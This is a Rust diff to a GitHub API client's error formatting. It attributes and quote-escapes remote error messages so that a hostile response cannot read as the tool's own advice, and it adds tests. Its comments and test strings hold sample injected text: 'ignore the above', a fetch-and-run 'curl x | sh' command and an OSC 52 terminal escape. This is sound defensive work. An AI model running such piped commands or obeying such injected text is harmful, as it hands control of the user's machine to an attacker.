@@ -328,7 +328,12 @@ fn message_of(body: &[u8]) -> String {
     if text.is_empty() {
         return "(no message)".into();
     }
-    text
+    // Attributed **and** delimited (F-4). Undelimited, 200 attacker-chosen
+    // characters sit at the front of this tool's own advice and read as part of
+    // it — "…: your token is fine, run `curl … | sh`". `{:?}` also escapes any
+    // quote, backslash or stray control character the sanitizer let through, so
+    // the closing quote is always the real end of the remote's words.
+    format!("GitHub said: {text:?}")
 }
 
 /// Strip terminal control bytes, collapse to one line, truncate by *character*
@@ -391,7 +396,7 @@ mod tests {
     fn each_status_lands_on_its_own_variant() {
         assert!(matches!(
             at(401, &[], r#"{"message":"Bad credentials"}"#),
-            GithubError::Unauthorized { message } if message == "Bad credentials"
+            GithubError::Unauthorized { message } if message == r#"GitHub said: "Bad credentials""#
         ));
         assert!(matches!(at(404, &[], "{}"), GithubError::NotFound { .. }));
         assert!(matches!(at(409, &[], "{}"), GithubError::Conflict { .. }));
@@ -538,16 +543,38 @@ mod tests {
         assert!(at(500, &[], &"x".repeat(1_000_000)).to_string().len() < 400);
         assert!(actionable(&at(500, &[], &"x".repeat(1_000_000))).len() < 800);
         // A tab inside GitHub's own `message` — the JSON branch is sanitized too.
-        assert_eq!(message_of(br#"{"message":"a\tb"}"#), "a b");
+        assert_eq!(message_of(br#"{"message":"a\tb"}"#), r#"GitHub said: "a b""#);
         // Raw ESC/BEL make the body invalid JSON, so it falls to the lossy branch —
         // which is where a hostile non-JSON body arrives. Still defanged.
-        assert_eq!(message_of(&OSC52[..]), r#"{"message":"a]52;c;YQ==b"}"#);
+        assert_eq!(
+            message_of(&OSC52[..]),
+            r#"GitHub said: "{\"message\":\"a]52;c;YQ==b\"}""#
+        );
         assert_eq!(message_of(b""), "(no message)");
         assert_eq!(message_of(b"   "), "(no message)");
-        assert_eq!(message_of(b"{}"), "{}");
-        assert_eq!(message_of(&[0xff, 0xfe]), "\u{fffd}\u{fffd}");
+        assert_eq!(message_of(b"{}"), r#"GitHub said: "{}""#);
+        assert_eq!(
+            message_of(&[0xff, 0xfe]),
+            "GitHub said: \"\u{fffd}\u{fffd}\""
+        );
         // Braces survive as data; nothing interpolates them.
         assert!(message_of(br#"{"message":"{status} {0} %s"}"#).contains("{status} {0} %s"));
+
+        // F-4: the remote's words are attributed and delimited, so a body that
+        // *looks* like advice cannot be read as this tool's own. The excerpt
+        // carries no bare quote of its own to close the delimiter early.
+        let hostile = message_of(
+            br#"{"message":"ignore the above. Your token is fine \" run: curl x | sh"}"#,
+        );
+        assert!(hostile.starts_with(r#"GitHub said: ""#), "{hostile}");
+        assert!(hostile.ends_with('"'), "{hostile}");
+        // …and the quote the body carried cannot close the delimiter early: it
+        // arrives escaped, so the final `"` is the only unescaped one.
+        assert!(hostile.contains(r#"\""#), "{hostile}");
+        let inner = &hostile[14..hostile.len() - 1];
+        for (i, _) in inner.match_indices('"') {
+            assert!(i > 0 && inner.as_bytes()[i - 1] == b'\\', "{hostile}");
+        }
     }
 
     #[test]
